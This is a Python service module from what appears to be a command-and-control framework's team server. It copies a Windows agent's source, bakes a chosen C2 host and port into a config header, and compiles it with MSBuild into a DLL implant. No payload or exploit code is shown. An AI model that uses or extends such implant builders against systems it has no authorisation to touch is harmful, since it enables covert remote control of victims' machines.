import datetime
import os
import shutil
import subprocess
import threading
from pathlib import Path

from Models.Build.build import Build, BuildStatus


def singleton(cls):
    instances = {}
    def get_instance(*args, **kwargs):
        if cls not in instances:
            instances[cls] = cls(*args, **kwargs)
        return instances[cls]
    return get_instance


# Paths are resolved relative to this file: TeamServer/Services/builder_service.py
_THIS_DIR   = Path(__file__).parent
_SERVER_DIR = _THIS_DIR.parent
_REPO_ROOT  = _SERVER_DIR.parent

AGENT_SRC  = _REPO_ROOT / "AgentWindows" / "AgentWindows"
BUILDS_DIR = _SERVER_DIR / "builds"

ARCH_PLATFORM = {
    "x64":   "x64",
    "x86":   "Win32",   # MSBuild uses Win32 for x86 targets
    "ARM64": "ARM64",
}


@singleton
class BuilderService:
    def __init__(self):
        self._builds: dict[str, Build] = {}
        self._lock = threading.Lock()
        BUILDS_DIR.mkdir(parents=True, exist_ok=True)
        # Cache MSBuild availability at startup so the UI can show it immediately
        try:
            self._msbuild_path: str | None = self._find_msbuild()
            self._msbuild_error: str = ""
        except FileNotFoundError as e:
            self._msbuild_path = None
            self._msbuild_error = str(e)

    def check(self) -> dict:
        return {
            "available": self._msbuild_path is not None,
            "msbuild_path": self._msbuild_path,
            "error": self._msbuild_error,
        }

    # ------------------------------------------------------------------ public

    def create_build(self, host: str, port: int, arch: str) -> Build:
        build = Build(host, port, arch)
        with self._lock:
            self._builds[build.id] = build
        threading.Thread(target=self._run_build, args=(build,), daemon=True).start()
        return build

    def get_build(self, build_id: str) -> Build | None:
        with self._lock:
            return self._builds.get(build_id)

    def get_all_builds(self) -> list[Build]:
        with self._lock:
            return list(self._builds.values())

    def artifact_path(self, build_id: str) -> Path | None:
        p = BUILDS_DIR / build_id / "output" / "AgentWindows.dll"
        return p if p.exists() else None

    def delete_build(self, build_id: str) -> bool:
        build_dir = BUILDS_DIR / build_id
        if build_dir.exists():
            shutil.rmtree(build_dir, ignore_errors=True)
        with self._lock:
            return self._builds.pop(build_id, None) is not None

    # ----------------------------------------------------------------- private

    def _run_build(self, build: Build):
        build_dir  = BUILDS_DIR / build.id
        src_dir    = build_dir / "src"
        output_dir = build_dir / "output"
        int_dir    = build_dir / "int"
        output_dir.mkdir(parents=True, exist_ok=True)

        try:
            # 1. Verify MSBuild is available before doing any filesystem work
            msbuild = self._find_msbuild()

            # 2. Isolate: copy source tree into a per-build scratch directory
            shutil.copytree(AGENT_SRC, src_dir)

            # 3. Inject build parameters via the generated config header
            (src_dir / "AgentConfig.h").write_text(
                f'#pragma once\n'
                f'#define AGENT_C2_HOST "{build.host}"\n'
                f'#define AGENT_C2_PORT {build.port}\n'
            )

            # 4. Build
            platform = ARCH_PLATFORM.get(build.arch, "x64")
            cmd = [
                msbuild,
                str(src_dir / "AgentWindows.vcxproj"),
                "/p:Configuration=Release",
                f"/p:Platform={platform}",
                f"/p:OutDir={output_dir}{os.sep}",   # trailing separator required
                f"/p:IntDir={int_dir}{os.sep}",
                "/nologo",
                "/verbosity:minimal",
            ]

            with self._lock:
                build.status = BuildStatus.RUNNING

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

            with self._lock:
                build.finished_at = datetime.datetime.utcnow()
                if result.returncode == 0:
                    build.status = BuildStatus.SUCCESS
                else:
                    build.status    = BuildStatus.FAILED
                    build.error_log = (result.stdout + "\n" + result.stderr)[-4000:].strip()

        except subprocess.TimeoutExpired:
            with self._lock:
                build.status      = BuildStatus.FAILED
                build.finished_at = datetime.datetime.utcnow()
                build.error_log   = "Build timed out after 300 seconds."

        except FileNotFoundError as e:
            with self._lock:
                build.status      = BuildStatus.FAILED
                build.finished_at = datetime.datetime.utcnow()
                build.error_log   = (
                    f"MSBuild not found: {e}\n"
                    "Ensure Visual Studio (with the C++ workload) or "
                    "Build Tools for Visual Studio is installed."
                )

        except Exception as e:
            with self._lock:
                build.status      = BuildStatus.FAILED
                build.finished_at = datetime.datetime.utcnow()
                build.error_log   = str(e)

        finally:
            # Always remove scratch sources and intermediate files; keep the DLL
            shutil.rmtree(src_dir,  ignore_errors=True)
            shutil.rmtree(int_dir,  ignore_errors=True)

    @staticmethod
    def _find_msbuild() -> str:
        vswhere = (
            r"C:\Program Files (x86)\Microsoft Visual Studio\Installer\vswhere.exe"
        )
        if os.path.exists(vswhere):
            r = subprocess.run(
                [
                    vswhere,
                    "-latest",
                    "-requires", "Microsoft.Component.MSBuild",
                    "-find", r"MSBuild\**\Bin\MSBuild.exe",
                ],
                capture_output=True, text=True,
            )
            paths = [p.strip() for p in r.stdout.strip().splitlines() if p.strip()]
            if paths:
                return paths[-1]

        # Hard-coded fallback for VS 2022 Community
        fallback = (
            r"C:\Program Files\Microsoft Visual Studio\2022\Community"
            r"\MSBuild\Current\Bin\MSBuild.exe"
        )
        if os.path.exists(fallback):
            return fallback

        raise FileNotFoundError("MSBuild.exe not found via vswhere or fallback path.")
